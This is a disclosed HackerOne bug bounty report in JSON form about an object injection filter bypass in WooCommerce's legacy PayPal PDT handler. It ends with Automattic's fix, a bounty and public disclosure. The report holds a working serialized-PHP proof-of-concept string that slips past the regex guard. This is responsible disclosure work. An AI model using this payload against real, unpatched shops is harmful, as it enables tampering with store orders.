{"id":245228,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUyMjg=","url":"https://hackerone.com/reports/245228","title":"Object Injection in Woocommerce / Handle PDT Responses from PayPal","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-07-02T01:13:06.370Z","submitted_at":"2017-07-02T01:13:06.370Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"b258ea62bf297b02afa9854","url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-09-11T13:48:49.750Z","bug_reporter_agreed_on_going_public_at":"2017-08-16T12:53:50.942Z","team_member_agreed_on_going_public_at":"2017-09-11T13:48:49.700Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"At this moment prevention from object injection is in the following line of code: \n```\npreg_match( '/^a:2:{/', $raw_custom ) \u0026\u0026 ! preg_match( '/[CO]:\\+?[0-9]+:\"/', $raw_custom ) \u0026\u0026 ( $custom = maybe_unserialize( $raw_custom ) )\n```\nbut the PHP native [unserialize](https://github.com/php/php-src/blob/master/ext/standard/var_unserializer.c) function supports little `o` as option in it and it is a StdClass object. \n\nDue this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital `S` then for some attacks even known firewall rules will fail/will be bypassed.\n```\n$attack_str = 'a:2:{i:1;s:3:\"key\";i:0;o:3:\"s:2:\"ID\";o:1:\"s:0:\"\";o:1:\"s:2:\"ID\";S:1:\"1\";}}s:9:\"order_key\";s:3:\"key\";s:9:\"post_type\";s:2:\"ok\";}}';\n\nif (preg_match( '/^a:2:{/', $attack_str ) \u0026\u0026 ! preg_match( '/[CO]:\\+?[0-9]+:\"/', $attack_str )){\n\tvar_dump(unserialize($attack_str));\n}\n```\n","vulnerability_information_html":"\u003cp\u003eAt this moment prevention from object injection is in the following line of code: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003epreg_match( \u0026#39;/^a:2:{/\u0026#39;, $raw_custom ) \u0026amp;\u0026amp; ! preg_match( \u0026#39;/[CO]:\\+?[0-9]+:\u0026quot;/\u0026#39;, $raw_custom ) \u0026amp;\u0026amp; ( $custom = maybe_unserialize( $raw_custom ) )\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ebut the PHP native \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fblob%2Fmaster%2Fext%2Fstandard%2Fvar_unserializer.c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eunserialize\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e function supports little \u003ccode\u003eo\u003c/code\u003e as option in it and it is a StdClass object. \u003c/p\u003e\n\n\u003cp\u003eDue this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital \u003ccode\u003eS\u003c/code\u003e then for some attacks even known firewall rules will fail/will be bypassed.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$attack_str = \u0026#39;a:2:{i:1;s:3:\u0026quot;key\u0026quot;;i:0;o:3:\u0026quot;s:2:\u0026quot;ID\u0026quot;;o:1:\u0026quot;s:0:\u0026quot;\u0026quot;;o:1:\u0026quot;s:2:\u0026quot;ID\u0026quot;;S:1:\u0026quot;1\u0026quot;;}}s:9:\u0026quot;order_key\u0026quot;;s:3:\u0026quot;key\u0026quot;;s:9:\u0026quot;post_type\u0026quot;;s:2:\u0026quot;ok\u0026quot;;}}\u0026#39;;\n\nif (preg_match( \u0026#39;/^a:2:{/\u0026#39;, $attack_str ) \u0026amp;\u0026amp; ! preg_match( \u0026#39;/[CO]:\\+?[0-9]+:\u0026quot;/\u0026#39;, $attack_str )){\n    var_dump(unserialize($attack_str));\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"300.0","formatted_bounty":"$300","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-09-15T12:53:50.990Z","allow_singular_disclosure_after":-103738566.93653357,"singular_disclosure_allowed":true,"vote_count":7,"voters":["marcs0h","cuso4","eveeez","apapedulimu","luckydivino","mr_r3boot","japz"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1797161,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Same applies towards `json` handle e.g. check for `is_object( $custom )` are not enough, but instead we need to be sure that \n```\n$order_id  = $custom-\u003eorder_id;\n$order_key = $custom-\u003eorder_key;\n```\nare not objects, specially `$order_id  = $custom-\u003eorder_id;`.","markdown_message":"\u003cp\u003eSame applies towards \u003ccode\u003ejson\u003c/code\u003e handle e.g. check for \u003ccode\u003eis_object( $custom )\u003c/code\u003e are not enough, but instead we need to be sure that \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$order_id  = $custom-\u0026gt;order_id;\n$order_key = $custom-\u0026gt;order_key;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eare not objects, specially \u003ccode\u003e$order_id  = $custom-\u0026gt;order_id;\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-02T01:38:24.389Z","updated_at":"2017-07-02T01:38:24.389Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1797673,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Regarding possible attacks towards PHP version on the server via `unserialize` [PoC code on 3v4l](https://3v4l.org/qRdGZ#output)","markdown_message":"\u003cp\u003eRegarding possible attacks towards PHP version on the server via \u003ccode\u003eunserialize\u003c/code\u003e \u003ca href=\"/redirect?url=https%3A%2F%2F3v4l.org%2FqRdGZ%23output\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePoC code on 3v4l\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-02T13:50:26.658Z","updated_at":"2017-07-02T13:50:26.658Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1799500,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi. Thanks for the report. We are going to take a look.","markdown_message":"\u003cp\u003eHi. Thanks for the report. We are going to take a look.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-03T15:01:42.287Z","updated_at":"2017-07-03T15:01:42.287Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1878570,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What is the status of this one? ","markdown_message":"\u003cp\u003eWhat is the status of this one? \u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-31T00:31:21.426Z","updated_at":"2017-07-31T00:31:21.426Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1892982,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi. The WooCommerce 3.1.1 release fixed this issue (we removed the legacy paypal code). Thanks again for the report.","markdown_message":"\u003cp\u003eHi. The WooCommerce 3.1.1 release fixed this issue (we removed the legacy paypal code). Thanks again for the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-04T13:55:22.822Z","updated_at":"2017-08-04T13:55:22.822Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"b258ea62bf297b02afa9854","url":"/b258ea62bf297b02afa9854"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1892991,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-04T14:01:10.943Z","updated_at":"2017-08-04T14:01:10.943Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"b258ea62bf297b02afa9854","url":"/b258ea62bf297b02afa9854"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1933302,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi, just before end of August I plan to release a public advisory for this issue due the fact update is pushed and issue is resolved.","markdown_message":"\u003cp\u003eHi, just before end of August I plan to release a public advisory for this issue due the fact update is pushed and issue is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-16T12:53:50.957Z","updated_at":"2017-08-16T12:53:50.957Z","first_to_agree":true,"actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1989088,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-11T13:48:49.715Z","updated_at":"2017-09-11T13:48:49.715Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1989089,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-11T13:48:49.764Z","updated_at":"2017-09-11T13:48:49.764Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}